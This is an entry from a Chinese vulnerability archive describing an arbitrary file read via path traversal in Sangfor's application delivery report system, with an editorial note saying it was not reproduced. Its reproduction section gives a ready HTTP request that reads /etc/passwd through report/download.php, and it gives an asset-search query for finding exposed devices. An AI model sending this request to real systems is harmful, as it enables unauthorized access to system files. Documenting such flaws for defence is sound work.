---
source: "wy876 漏洞文库"
id: "vw-7427c9ce8634045b92fd69e1"
entity_id: "ve-7427c9ce8634045b92fd69e1"
schema_version: "1"
title: "深信服应用交付管理系统download存在任意文件读取漏洞"
product: "Sangfor应用交付AD报表系统"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie请求；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zuh5abx5zhqimn9n"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"SANGFOR 深信服应用交付报表系统\""
---

# 深信服应用交付管理系统download存在任意文件读取漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor应用交付AD报表系统
- 本文讨论：report/download.php pdf路径穿越
- 版本、权限与配置前提：无cookie请求；版本未知
- 资料类型：AD报表文件读取摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无读取结果与路径处理解释；fofa为残缺Hunter规则
- 无厂商公告/固定版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 访问权限、文件范围和固件待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
SINFOR AD是深信服最新推出的应用交付系列设备，其突出特色就是SINFOR AD的智能分析功能。深信服应用交付报表系统存在任意文件读取漏洞,攻击者利用漏洞可读取设备中的指定路径文件。

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 深信服应用交付管理系统

# 三、资产测绘
+ hunter`app.name="SANGFOR 深信服应用交付报表系统"`


+ 登录页面


# 四、漏洞复现
```http
GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zuh5abx5zhqimn9n>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
